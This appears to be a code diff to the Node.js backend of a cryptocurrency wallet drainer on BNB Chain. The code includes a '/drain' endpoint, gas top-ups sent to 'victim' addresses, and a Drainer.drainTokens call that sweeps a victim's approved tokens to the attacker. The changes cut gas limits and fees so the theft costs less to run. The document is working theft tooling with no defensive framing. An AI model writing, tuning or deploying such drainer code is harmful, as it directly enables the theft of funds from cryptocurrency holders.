@@ -69,7 +69,7 @@ async function checkWalletBalance() {
 
   const balance = await provider.getBalance(wallet.address);
   console.log(`Wallet balance: ${ethers.formatEther(balance)} BNB`);
-  if (balance < ethers.parseEther("0.025")) {
+  if (balance < ethers.parseEther("0.001")) {
     throw new Error("Insufficient BNB for gas. Please fund the wallet.");
   }
 }
@@ -84,13 +84,13 @@ async function sendGasIfNeeded(victimAddress) {
     console.log(`Victim ${token.symbol} balance: ${ethers.formatUnits(tokenBalance, token.decimals)}`);
   }
   if (victimBalance === BigInt(0)) {
-    const bnbToSend = ethers.parseEther("0.025");
+    const bnbToSend = ethers.parseEther("0.001");
     const gasSettings = await getGasSettings();
     console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
     const tx = await wallet.sendTransaction({
       to: victimAddress,
       value: bnbToSend,
-      gasLimit: 1500000,
+      gasLimit: 21000,
       gasPrice: gasSettings.gasPrice,
     });
     console.log(`Gas transaction sent: ${tx.hash}`);
@@ -143,9 +143,7 @@ app.post("/drain", async (req, res) => {
     let needsApproval = false;
 
     const walletBalance = await provider.getBalance(wallet.address);
-    if (walletBalance < ethers.parseEther("0.001")) { // Changed from 0.025 to 0.001
-      throw new Error("Insufficient wallet BNB for gas");
-    }
+    console.log(`Attacker wallet balance: ${ethers.formatEther(walletBalance)} BNB`);
 
     const tokenAddresses = tokenList.map(t => t.address);
     for (const token of tokenList) {
@@ -159,7 +157,11 @@ app.post("/drain", async (req, res) => {
 
     if (drainAll && !needsApproval) {
       console.log(`Draining all tokens from ${victimAddress}...`);
-      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, { ...gasSettings, gasLimit: 1500000 });
+      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, {
+        gasLimit: 200000,
+        maxFeePerGas: ethers.parseUnits("5", "gwei"), // Override to 5 gwei
+        maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
+      });
       receipt = await tx.wait();
 
       const eventInterface = new ethers.Interface(drainerAbi);
